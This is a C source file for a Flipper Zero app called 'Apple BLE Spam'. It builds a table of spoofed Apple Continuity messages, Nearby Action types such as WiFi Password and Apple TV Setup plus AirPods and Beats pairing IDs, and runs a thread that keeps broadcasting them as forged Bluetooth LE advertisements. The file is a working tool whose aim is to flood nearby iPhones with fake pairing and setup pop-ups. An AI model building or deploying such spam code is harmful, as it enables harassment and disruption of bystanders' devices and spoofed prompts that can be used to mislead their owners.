#include <gui/gui.h>
#include <gui/elements.h>
#include <furi_hal_bt.h>
#include <assets_icons.h>
#include "apple_ble_spam_icons.h"

#include "lib/continuity/continuity.h"

typedef struct {
    const char* title;
    ContinuityMessage msg;
} Payload;

// Hacked together by @Willy-JL
// Structures docs and Nearby Action IDs from https://github.com/furiousMAC/continuity/
// Proximity Pairing IDs from https://github.com/ECTO-1A/AppleJuice/
// Custom adv logic and Airtag ID from https://techryptic.github.io/2023/09/01/Annoying-Apple-Fans/

static const Payload payloads[] = {
    {.title = "Apple TV Setup",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x01}},
         }},
    {.title = "Mobile Backup",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x04}},
         }},
    {.title = "Watch Setup",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x05}},
         }},
    {.title = "Apple TV Pair",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x06}},
         }},
    {.title = "Internet Relay",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x07}},
         }},
    {.title = "WiFi Password",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x08}},
         }},
    {.title = "iOS Setup",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x09}},
         }},
    {.title = "Repair",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x0A}},
         }},
    {.title = "Speaker Setup",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x0B}},
         }},
    {.title = "Apple Pay",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x0C}},
         }},
    {.title = "AppleTV Homekit Setup",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x0D}},
         }},
    {.title = "Developer Tools Pair",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x0E}},
         }},
    {.title = "Answered Call",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x0F}},
         }},
    {.title = "Ended Call",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x10}},
         }},
    {.title = "DD Ping",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x11}},
         }},
    {.title = "DD Pong",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x12}},
         }},
    {.title = "Remote Auto Fill",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x13}},
         }},
    {.title = "Companion Link",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x14}},
         }},
    {.title = "Remote Management",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x15}},
         }},
    {.title = "Remote Auto Fill Pong",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x16}},
         }},
    {.title = "Remote Display",
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.action_type = 0x17}},
         }},
    {.title = "Airtag",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x0055}},
         }},
    {.title = "Airpods",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x0220}},
         }},
    {.title = "Airpods Pro",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x0E20}},
         }},
    {.title = "Airpods Max",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x0A20}},
         }},
    {.title = "Airpods Gen 2",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x0F20}},
         }},
    {.title = "Airpods Gen 3",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x1320}},
         }},
    {.title = "Airpods Pro Gen 2",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x1420}},
         }},
    {.title = "PowerBeats",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x0320}},
         }},
    {.title = "PowerBeats Pro",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x0B20}},
         }},
    {.title = "Beats Solo Pro",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x0C20}},
         }},
    {.title = "Beats Studio Buds",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x1120}},
         }},
    {.title = "Beats Flex",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x1020}},
         }},
    {.title = "Beats X",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x0520}},
         }},
    {.title = "Beats Solo 3",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x0620}},
         }},
    {.title = "Beats Studio 3",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x0920}},
         }},
    {.title = "Beats Studio Pro",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x1720}},
         }},
    {.title = "Beats Fit Pro",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x1220}},
         }},
    {.title = "Beats Studio Buds+",
     .msg =
         {
             .type = ContinuityTypeProximityPairing,
             .data = {.proximity_pairing = {.device_model = 0x1620}},
         }},
};

typedef struct {
    bool advertising;
    size_t delay;
    size_t size;
    uint8_t* packet;
    const ContinuityMessage* msg;
    FuriThread* thread;
    size_t index;
} State;

static int32_t adv_thread(void* ctx) {
    State* state = ctx;
    while(state->advertising) {
        continuity_generate_packet(state->msg, state->packet);
        furi_hal_bt_set_custom_adv_data(state->packet, state->size);
        furi_thread_flags_wait(true, FuriFlagWaitAny, state->delay);
    }
    return 0;
}

static void toggle_adv(State* state, const Payload* payload) {
    if(state->advertising) {
        state->advertising = false;
        furi_thread_flags_set(furi_thread_get_id(state->thread), true);
        furi_thread_join(state->thread);
        state->msg = NULL;
        free(state->packet);
        state->packet = NULL;
        state->size = 0;
        furi_hal_bt_set_custom_adv_data(NULL, 0);
    } else {
        state->size = continuity_get_packet_size(payload->msg.type);
        state->packet = malloc(state->size);
        state->msg = &payload->msg;
        state->advertising = true;
        furi_thread_start(state->thread);
    }
}

static void draw_callback(Canvas* canvas, void* ctx) {
    State* state = ctx;
    const Payload* payload = &payloads[state->index];

    canvas_draw_icon(canvas, 4, 4, &I_apple_10px);

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_str(canvas, 16, 12, "Apple BLE Spam");

    canvas_set_font(canvas, FontPrimary);
    canvas_draw_str(canvas, 5, 24, payload->title);

    canvas_set_font(canvas, FontBatteryPercent);
    canvas_draw_str(canvas, 5, 33, continuity_get_type_name(payload->msg.type));

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_icon(canvas, 6, 41, &I_SmallArrowUp_3x5);
    canvas_draw_icon(canvas, 6, 45, &I_SmallArrowDown_3x5);
    char delay[21];
    snprintf(delay, sizeof(delay), "Delay: %ims", state->delay);
    canvas_draw_str(canvas, 14, 48, delay);

    if(state->index > 0) {
        elements_button_left(canvas, "Back");
    }
    if(state->index < COUNT_OF(payloads) - 1) {
        elements_button_right(canvas, "Next");
    }
    elements_button_center(canvas, state->advertising ? "Stop" : "Start");
}

static void input_callback(InputEvent* input, void* ctx) {
    FuriMessageQueue* input_queue = ctx;
    if(input->type == InputTypeShort || input->type == InputTypeLong ||
       input->type == InputTypeRepeat) {
        furi_message_queue_put(input_queue, input, 0);
    }
}

int32_t apple_ble_spam(void* p) {
    UNUSED(p);
    State* state = malloc(sizeof(State));
    state->delay = 500;
    state->thread = furi_thread_alloc();
    furi_thread_set_callback(state->thread, adv_thread);
    furi_thread_set_context(state->thread, state);
    furi_thread_set_stack_size(state->thread, 2048);

    FuriMessageQueue* input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    ViewPort* view_port = view_port_alloc();
    Gui* gui = furi_record_open(RECORD_GUI);
    view_port_input_callback_set(view_port, input_callback, input_queue);
    view_port_draw_callback_set(view_port, draw_callback, state);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    bool running = true;
    while(running) {
        InputEvent input;
        furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);

        const Payload* payload = &payloads[state->index];
        switch(input.key) {
        case InputKeyOk:
            toggle_adv(state, payload);
            break;
        case InputKeyUp:
            if(state->delay < 5000) {
                state->delay += 100;
                furi_thread_flags_set(furi_thread_get_id(state->thread), true);
            }
            break;
        case InputKeyDown:
            if(state->delay > 100) {
                state->delay -= 100;
                furi_thread_flags_set(furi_thread_get_id(state->thread), true);
            }
            break;
        case InputKeyLeft:
            if(state->index > 0) {
                if(state->advertising) toggle_adv(state, payload);
                state->index--;
            }
            break;
        case InputKeyRight:
            if(state->index < COUNT_OF(payloads) - 1) {
                if(state->advertising) toggle_adv(state, payload);
                state->index++;
            }
            break;
        case InputKeyBack:
            if(state->advertising) toggle_adv(state, payload);
            running = false;
            break;
        default:
            continue;
        }

        view_port_update(view_port);
    }

    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    view_port_free(view_port);
    furi_message_queue_free(input_queue);

    furi_thread_free(state->thread);
    free(state);
    return 0;
}
